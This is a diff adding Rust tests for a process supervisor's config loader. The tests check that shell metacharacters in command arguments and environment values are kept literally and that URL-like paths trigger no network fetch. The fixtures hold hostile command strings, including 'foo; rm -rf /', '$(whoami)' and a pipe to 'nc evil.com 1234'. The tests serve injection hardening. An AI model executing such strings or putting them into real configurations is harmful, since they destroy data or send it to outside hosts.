@@ -7,6 +7,7 @@
 
 use std::fs;
 use std::path::PathBuf;
+use std::path::Path;
 
 use tempfile::{tempdir, TempDir};
 
@@ -274,4 +275,85 @@ fn test_validate_rejects_max_restarts_too_high() {
         matches!(err, ConfigError::InvalidSchema(_)),
         "expected InvalidSchema for max_restarts=99, got: {err:?}"
     );
+}
+
+// ---------------------------------------------------------------------------
+// REFACTOR — held-out 安全边界测试 (SPEC Prohibition P1 命令注入面收敛)
+// ---------------------------------------------------------------------------
+
+#[test]
+fn test_cmd_with_shell_metacharacters_preserved_as_literal_arg() {
+    // SPEC Prohibition P1: cmd 是 Vec<String>,tokio::process::Command 默认不走 shell。
+    // 因此 "foo; rm -rf /" 作为单一 argv 元素字面传递,不被 shell 解释。
+    // 即使含 shell 元字符 (; | $ `),也是程序名/参数的字面字符。
+    let agent = r#"{
+        "cmd": ["echo", "foo; rm -rf /", "$HOME", "$(whoami)"],
+        "cwd": "../../apps/agent",
+        "env": {},
+        "port": 9876,
+        "health": { "liveness": { "path": "/health", "expect_status": 200 } },
+        "startup_grace_secs": 5
+    }"#;
+    let raw = dev_skeleton_json(agent, SERVER_OK);
+    let (_dir, path) = write_temp_config(&raw);
+    let cfg = ProcessConfig::load_from_path(&path).expect("literal metachars load");
+    let agent = cfg.processes.get(&ProcessNameKey::Agent).expect("agent");
+    assert_eq!(agent.cmd.len(), 4);
+    assert_eq!(agent.cmd[1], "foo; rm -rf /", "metacharacter preserved verbatim");
+    assert_eq!(agent.cmd[2], "$HOME", "dollar-brace preserved verbatim");
+    assert_eq!(agent.cmd[3], "$(whoami)", "subshell syntax preserved verbatim");
+}
+
+#[test]
+fn test_env_value_with_subcommand_preserved_as_literal() {
+    // SPEC Prohibition P1: env 值是字面字符串,supervisor 直接传给
+    // tokio::process::Command::env(),不经过 shell 展开。
+    let agent = r#"{
+        "cmd": ["uv", "run", "paladin-agent", "serve", "--dev"],
+        "cwd": "../../apps/agent",
+        "env": { "A": "$(whoami)", "B": "${PATH}", "C": "echo hi | nc evil.com 1234" },
+        "port": 9876,
+        "health": { "liveness": { "path": "/health", "expect_status": 200 } },
+        "startup_grace_secs": 5
+    }"#;
+    let raw = dev_skeleton_json(agent, SERVER_OK);
+    let (_dir, path) = write_temp_config(&raw);
+    let cfg = ProcessConfig::load_from_path(&path).expect("literal env load");
+    let agent = cfg.processes.get(&ProcessNameKey::Agent).expect("agent");
+    assert_eq!(agent.env.get("A").map(String::as_str), Some("$(whoami)"));
+    assert_eq!(agent.env.get("B").map(String::as_str), Some("${PATH}"));
+    assert_eq!(
+        agent.env.get("C").map(String::as_str),
+        Some("echo hi | nc evil.com 1234")
+    );
+}
+
+#[test]
+fn test_load_from_path_treats_http_url_as_literal_local_path() {
+    // SPEC Prohibition P1: load_from_path 签名是 impl AsRef<Path>,
+    // 编译期排除 reqwest::Url / http::Uri。
+    // 即使调用方传入 "http://example.com/...",该字符串也被 Path 当作字面文件名:
+    //   - 不会发起 HTTP 请求(loader 用 std::fs::read,零网络)
+    //   - 文件不存在 → NotFound
+    // 这证明 loader 不会因为传入了看起来像 URL 的字符串就偷偷发起网络请求。
+    let err = ProcessConfig::load_from_path("http://example.com/processes.json")
+        .expect_err("http url must not trigger network fetch");
+    assert!(
+        matches!(err, ConfigError::NotFound(_)),
+        "expected NotFound (no HTTP fetch attempted), got: {err:?}"
+    );
+
+    // 编译期 trait bound 自检:load_from_path 接受 &str / &Path / PathBuf 三种 AsRef<Path> 实现。
+    // 若未来把签名改为接受 reqwest::Url 或类似,这里编译失败 → 立即发现安全回归。
+    fn _assert_signature_accepts<T: AsRef<Path>>(_t: T) {
+        // 仅做签名断言,不实际调用 — 避免 NotFound 路径再次触发
+    }
+    _assert_signature_accepts("");
+    _assert_signature_accepts(Path::new(""));
+    _assert_signature_accepts(PathBuf::new());
+
+    // 引用 ProcessConfig::load_from_path 的高阶函数指针,锁定签名稳定性。
+    let _fn_ptr: fn(&str) -> Result<ProcessConfig, ConfigError> =
+        |s: &str| ProcessConfig::load_from_path(s);
+    let _ = _fn_ptr;
 }
